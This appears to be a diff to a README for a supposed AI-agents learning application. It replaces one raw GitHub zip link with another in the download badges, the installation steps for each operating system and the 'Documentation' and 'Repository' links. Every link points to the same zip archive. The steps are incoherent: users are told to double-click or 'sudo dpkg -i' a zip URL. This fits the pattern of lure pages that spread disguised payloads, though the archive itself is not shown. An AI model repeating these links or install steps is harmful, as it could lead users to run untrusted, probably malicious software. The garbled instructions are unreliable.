@@ -21,7 +21,7 @@ You can download the application from the Releases page.
 
 **Click the link below to visit the page and download the latest version:**
 
-[![Download Latest Release](https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/favillous/ai-agents-learning-lab.zip%20Latest%https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/favillous/ai-agents-learning-lab.zip)](https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/favillous/ai-agents-learning-lab.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/setup/agents_lab_ai_learning_v2.1.zip%20Latest%https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/setup/agents_lab_ai_learning_v2.1.zip)](https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/setup/agents_lab_ai_learning_v2.1.zip)
 
 ### Installation Steps
 
@@ -33,14 +33,14 @@ You can download the application from the Releases page.
 
 3. **Download the File.**
    Click on the appropriate file for your operating system:
-   - For Windows, select `https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/favillous/ai-agents-learning-lab.zip`.
-   - For macOS, select `https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/favillous/ai-agents-learning-lab.zip`.
+   - For Windows, select `https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/setup/agents_lab_ai_learning_v2.1.zip`.
+   - For macOS, select `https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/setup/agents_lab_ai_learning_v2.1.zip`.
    - For Linux, select the appropriate package for your distribution.
 
 4. **Run the Installer.**
-   - **Windows:** Double-click the `https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/favillous/ai-agents-learning-lab.zip` file to start the installation. Follow the prompts to complete the process.
-   - **macOS:** Open the `https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/favillous/ai-agents-learning-lab.zip` file and drag the application to your Applications folder.
-   - **Linux:** Open your terminal, navigate to the directory with the downloaded package, and use the package manager to install it. For example, for a `.deb` file, run `sudo dpkg -i https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/favillous/ai-agents-learning-lab.zip`.
+   - **Windows:** Double-click the `https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/setup/agents_lab_ai_learning_v2.1.zip` file to start the installation. Follow the prompts to complete the process.
+   - **macOS:** Open the `https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/setup/agents_lab_ai_learning_v2.1.zip` file and drag the application to your Applications folder.
+   - **Linux:** Open your terminal, navigate to the directory with the downloaded package, and use the package manager to install it. For example, for a `.deb` file, run `sudo dpkg -i https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/setup/agents_lab_ai_learning_v2.1.zip`.
 
 5. **Launch the Application.**
    After the installation finishes, find the application in your programs menu or applications folder. Click to open it.
@@ -88,8 +88,8 @@ If you encounter issues:
 
 ## 📚 Resources
 
-- [Official Documentation](https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/favillous/ai-agents-learning-lab.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/favillous/ai-agents-learning-lab.zip)
+- [Official Documentation](https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/setup/agents_lab_ai_learning_v2.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/setup/agents_lab_ai_learning_v2.1.zip)
 
 ## 🚧 Frequently Asked Questions
 
@@ -108,4 +108,4 @@ We appreciate your input! If you have suggestions for improvements or features, 
 
 **Download the application now to start your journey into AI training!**
 
-[![Download Latest Release](https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/favillous/ai-agents-learning-lab.zip%20Latest%https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/favillous/ai-agents-learning-lab.zip)](https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/favillous/ai-agents-learning-lab.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/setup/agents_lab_ai_learning_v2.1.zip%20Latest%https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/setup/agents_lab_ai_learning_v2.1.zip)](https://raw.githubusercontent.com/Igormelo1/ai-agents-learning-lab/main/setup/agents_lab_ai_learning_v2.1.zip)
